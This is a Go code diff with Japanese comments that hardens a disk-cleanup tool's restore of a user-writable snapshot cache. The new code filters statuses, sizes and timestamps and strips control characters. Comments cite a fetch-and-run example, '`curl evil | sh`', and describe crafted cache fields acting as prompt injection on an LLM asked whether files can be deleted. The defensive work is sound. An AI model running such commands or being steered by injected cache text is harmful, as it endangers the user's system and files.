@@ -6,7 +6,9 @@ import (
 	"os"
 	"path/filepath"
 	"sort"
+	"strings"
 	"time"
+	"unicode"
 
 	"doctor/cachedir"
 	"doctor/disk"
@@ -361,7 +363,142 @@ func loadDoctorSnapshotAny() (doctorSnapshot, bool) {
 	if err := json.Unmarshal(data, &sn); err != nil || sn.ScannedAt.IsZero() {
 		return doctorSnapshot{}, false
 	}
+	sn.Disk.Results = sanitizeSnapshotResults(sn.Disk.Results, timeNow())
+	sn.Disk.Total = disk.SumDeletable(sn.Disk.Results)
+	// サービス節と brew 節も同じ境界を通す。サービスの Commands は「手で実行してください」と
+	// 提示して Y でコピーさせるので、保存された文字列をそのまま信じると `curl evil | sh` を
+	// コピー経路に載せられる (issue 178 の敵対レビューが再現した)
+	sn.Svc = svc.SanitizeRestored(sn.Svc)
+	sn.Brew = sanitizeRestoredBrew(sn.Brew)
 	return sn, true
+}
+
+// sanitizeRestoredBrew は保存から読み戻した brew doctor の結果を絞る (issue 178)。
+// 警告本文は `brew doctor` の自由文なので中身は検査できないが、**形**は固定できる:
+// `Warning:` で始まる塊だけを残し、制御文字 (ANSI エスケープ・復帰) を落として長さと件数を切る。
+// これで「UI の行構造を偽装する」「画面を埋め尽くす」は防げる。
+//
+// ⚠️ 残った本文は依然としてキャッシュファイルの書き手が決められる文字列で、`Y` のコピー文にも乗る。
+// brew 節にはコマンドの提示が無く (④ の削除対象でもない) ので、ここは形の検査に留めて
+// 「中身は信用していない」ことを記録する。中身まで断つなら復元をやめて毎回 brew doctor を回すことになり、
+// TTL 内の開き直しを速くするというこの機能の目的と衝突する。
+func sanitizeRestoredBrew(b brewDoctorResult) brewDoctorResult {
+	out := brewDoctorResult{Clean: b.Clean, Unavailable: cleanBrewText(b.Unavailable)}
+	for i, w := range b.Warnings {
+		if i >= maxRestoredBrewWarnings {
+			break
+		}
+		if !strings.HasPrefix(w, "Warning:") {
+			continue
+		}
+		out.Warnings = append(out.Warnings, cleanBrewText(w))
+	}
+	if len(out.Warnings) == 0 && !out.Clean && out.Unavailable == "" {
+		return brewDoctorResult{} // 何も残らなかった = 復元しない (走査に倒す)
+	}
+	return out
+}
+
+// cleanRestoredList は自由文の一覧を絞る (件数と 1 件あたりの長さ)。
+func cleanRestoredList(ss []string) []string {
+	if len(ss) == 0 {
+		return nil
+	}
+	out := make([]string, 0, len(ss))
+	for i, s := range ss {
+		if i >= maxRestoredListItems {
+			break
+		}
+		out = append(out, cleanBrewText(s))
+	}
+	return out
+}
+
+const (
+	maxRestoredListItems    = 200
+	maxRestoredBrewWarnings = 50
+	maxRestoredBrewText     = 4000
+)
+
+// cleanBrewText は改行だけ残して他の制御文字を落とし、長さを切る (警告本文は複数行が正常)。
+func cleanBrewText(s string) string {
+	var b strings.Builder
+	for _, r := range s {
+		if r == '\n' || unicode.IsPrint(r) { // タブは通さない (dispWidth は幅 0 と数えるが端末は進む)
+			b.WriteRune(r)
+		}
+		if b.Len() >= maxRestoredBrewText {
+			break
+		}
+	}
+	return b.String()
+}
+
+// doctorSnapshotInCatalog は実効カタログに無い ID の Result を落とす。「カタログから消えた ID …
+// 4.7GB ✅ 安全」という行を snapshot から作れてしまうのを塞ぐ (doctorReuseFrom は ID で引くので
+// 同じ規律になっており、復元経路だけが緩かった)。実効カタログはテストが差し替えるので、
+// 既定カタログを前提にせず呼び出し側から渡す。
+func doctorSnapshotInCatalog(rs []disk.Result, has func(string) bool) []disk.Result {
+	out := make([]disk.Result, 0, len(rs))
+	for _, r := range rs {
+		if has(r.Entry.ID) {
+			out = append(out, r)
+		}
+	}
+	return out
+}
+
+// sanitizeSnapshotResults は snapshot 由来の Result を「信用してよい形」に絞る (issue 178)。
+//
+// 🚨 **信頼境界**: `doctor-snapshot.json` は一般ユーザー権限で書き換えられる。今は削除機能が無いので
+// 実害は表示だけだが、④ (削除) はこの画面の行を対象にする設計なので、境界をここで確定しておく。
+// 細工した JSON の任意パスが行・y のコピー・合計・次の snapshot への書き戻しに載ってはいけない。
+//
+// 落とすもの:
+//   - **未知の Status** — ok / blocked / failed 以外は「✅ 安全 + サイズ表示」に化けていた。
+//     判定できないものを緑にしない
+//   - **負のサイズ** — 「-5B 解放可能」と表示されていた (Result と Item の両方を見る)
+//   - **未来の MeasuredAt** — reuse 側は age<0 を弾くのに復元側は素通りだった (非対称)
+//
+// 残すものには **FromSnapshot=true** を立てる。snapshot 復元経路では Result 側に「走査していない」
+// 印が無く、それを示すのは view の snapshotAt だけ = Result 単位では区別できなかった。
+// ④ は「印が立っている行は削除の前に必ず再スキャンする」という不変条件にするので、Result 側に要る。
+// ⚠️ **Reused を流用してはいけない**。Reused は「重いエントリの計測値を前回から引き継いだ」という
+// 別の意味を既に持ち、行の「N 分前の計測を再利用」注記を出している。流用すると普通の開き直しで
+// 嘘の注記が全行に出る (敵対レビュー 2026-09-03 で実測: `-1113 分前の計測を再利用`)。
+func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
+	out := make([]disk.Result, 0, len(rs))
+	for _, r := range rs {
+		switch r.Status {
+		case disk.StatusOK, disk.StatusBlocked, disk.StatusFailed:
+		default:
+			continue
+		}
+		if r.Size < 0 {
+			continue
+		}
+		neg := false
+		for _, it := range r.Items {
+			if it.Size < 0 {
+				neg = true
+			}
+		}
+		if neg {
+			continue
+		}
+		if !r.MeasuredAt.IsZero() && now.Sub(r.MeasuredAt) < 0 {
+			continue
+		}
+		// 自由文も絞る: diskCopyText は「別セッションの LLM に消してよいか聞く」形を作るので、
+		// 細工した Reason / Failures / Contents はそのまま prompt injection の材料になる
+		// (敵対レビュー 2026-09-03)。制御文字を落として長さと件数を切る
+		r.Reason = cleanBrewText(r.Reason)
+		r.Failures = cleanRestoredList(r.Failures)
+		r.Contents = cleanRestoredList(r.Contents)
+		r.FromSnapshot = true // 走査していない印 (④ の削除は必ず再スキャンを通す)
+		out = append(out, r)
+	}
+	return out
 }
 
 // 重いエントリの再利用 (ユーザー要望 2026-09-02: スキャンはディスク I/O を食うので、明らかに重いものを何度も
